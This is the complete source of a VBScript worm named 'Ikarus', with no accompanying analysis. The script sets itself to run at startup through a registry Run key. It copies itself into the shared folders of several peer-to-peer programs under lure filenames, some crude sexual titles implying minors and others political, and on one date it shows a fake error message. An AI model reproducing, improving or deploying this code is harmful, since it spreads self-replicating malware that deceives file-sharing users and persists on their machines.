On error Resume Next
set shell = createobject("wscript.shell")
set fso = createobject("scripting.filesystemobject")
Ikarus = wscript.scriptfullname
fso.copyfile Ikarus,fso.getspecialfolder(2) & "\_uninst12.vbs"
shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runfaststart",fso.getspecialfolder(2)& "\_uninst12.vbs"
Pgdir = shell.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if day(now()) = 3 and month(now()) = 3 then
 msgbox "03/03/03 exception error. Please reboot.", vbCritical,"Address violation at 030303x"
end if
files = array("10 naked teens.jpg","15yteenfuck.jpg","Ad-Aware6.tar","illegalsex.jpg","kievgirl.jpg","Young russian teens.jpg","Bin Laden's Home.doc","Kamasutra2003.doc","Bush is crazy(and stupid).doc","How To Rip DVDs.txt","Eminem - I am your father.mp3","Anton - Schwul oder was.mp3")
kl = (Pgdir & "\kazaa lite\my shared folder") & "\"
if fso.folderexists(kl) then
 for x=0 to 11
  fso.copyfile Ikarus,kl & files(x) & ".vbs"
 next
end if
kazaa = (Pgdir & "\kazaa\my shared folder") & "\"
if fso.folderexists(kazaa) then
 for x=0 to 11
  fso.copyfile Ikarus,kl & files(x) & ".vbs"
 next
end if
bearshare = (Pgdir & "\bearshare\shared") & "\"
if fso.folderexists(bearshare) then
 for x=0 to 11
  fso.copyfile Ikarus,kl & files(x) & ".vbs"
 next
end if
edonkey = (Pgdir & "\edonkey2000\incoming") & "\"
if fso.folderexists(edonkey) then
 for x=0 to 11
  fso.copyfile Ikarus,kl & files(x) & ".vbs"
 next
end if
morpheus = (Pgdir & "\morpheus\my shared folder") & "\"
if fso.folderexists(morpheus) then
 for x=0 to 11
  fso.copyfile Ikarus,kl & files(x) & ".vbs"
 next
end if
rem Ikarus by SlageHammer